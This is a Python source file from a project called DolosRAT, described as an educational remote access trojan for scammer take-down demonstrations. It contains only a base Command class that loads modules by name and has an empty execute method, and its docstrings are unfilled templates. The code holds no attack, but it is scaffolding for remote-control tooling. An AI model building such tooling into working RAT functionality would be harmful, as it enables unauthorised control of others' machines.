# !/usr/bin/env python
# -*- coding: utf-8 -*-
#----------------------------------------------------------------------------
# Creator : Ryan I.
# Created Date: 17/06/2023
# version ='1.0'
# ---------------------------------------------------------------------------
"""
DolosRAT provides a GUI-based RAT client and server, purposed for demonstrating
techniques frequently used within scammer take-down operations. Please note that
the use of this tool is for educational purposes only.
"""

# Built-in/Generic Imports.
from importlib import import_module
from typing import Any, List, Union

class Command():
    """_summary_

    Args:
        ABC (_type_): _description_
    """

    def __init__(self: object) -> None:
        """_summary_

        Args:
            self (object): _description_

        Returns:
            Any: _description_
        """

        self._mods: List[Any] = []

    def get_dep(self: object, mod_name: str) -> Union[Any, None]:
        """_summary_

        Args:
            self (object): _description_
            mod_name (str): _description_

        Returns:
            bool: _description_
        """

        for idx, dep in enumerate(self._mods):
            if dep.__name__ == mod_name:
                return self._mods[idx]

        return None

    def create_deps(self: object, *mods: List[str]) -> None:
        """_summary_

        Args:
            self (object): _description_
        """

        try:
            for mod in mods:
                self._mods.append(import_module(mod))
        except ModuleNotFoundError:
            pass

    def execute(self: object) -> Any:
        """_summary_

        Args:
            self (object): _description_

        Returns:
            Any: _description_
        """

        pass
